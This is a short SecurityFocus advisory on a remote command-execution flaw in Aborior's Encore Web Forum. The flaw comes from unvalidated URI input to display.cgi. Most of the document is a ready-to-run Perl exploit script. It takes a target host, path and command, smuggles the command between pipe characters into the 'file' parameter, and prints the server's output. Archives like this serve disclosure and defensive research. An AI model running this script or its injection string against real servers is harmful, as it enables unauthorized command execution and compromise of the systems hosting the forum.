source: http://www.securityfocus.com/bid/10040/info

Encore Web Forum is reported prone to an issue that may allow a remote user to execute arbitrary commands on a system implementing the forum software. This issue is due to the application's failure to properly validate user-supplied URI input.

A remote attacker may exploit this condition to execute arbitrary commands in the context of the webserver that is hosting the vulnerable application. 

############################################################
#!/usr/bin/perl -w
#
# Remote Exploit Aborior's Encore Web Forum by Schizoprenic
# Bug found by k-159 from g-security.tk

require LWP::UserAgent;
use Getopt::Std;

getopts('t:d:c:');
our($opt_t, $opt_d, $opt_c);

my $target = $opt_t;
my $dir = $opt_d;
my $cmd = $opt_c;

print "Remote Exploit Aborior's Encore Web Forum  by Schizoprenic\n";
print "Xnuxer Research Laboratory (http://www.infosekuriti.com)\n";
print "Target: $target\n";
print "Path Dir: $dir\n";
print "Command: $cmd\n";

my $ua = LWP::UserAgent->new;
$ua->agent("IE/6.0 Windows");
$ua->timeout(10);
$ua->env_proxy;

$req = "http://$target$dir/display.cgi?preftemp=temp&page=anonymous&file=|$cmd|";

my $response = $ua->get($req);
print "--------------------RESULT--------------------\n";

if ($response->is_success) {
     print $response->content;
} else {
     die $response->status_line;
}

print "----------------------------------------------\n";

# EOF by Xnuxer
--
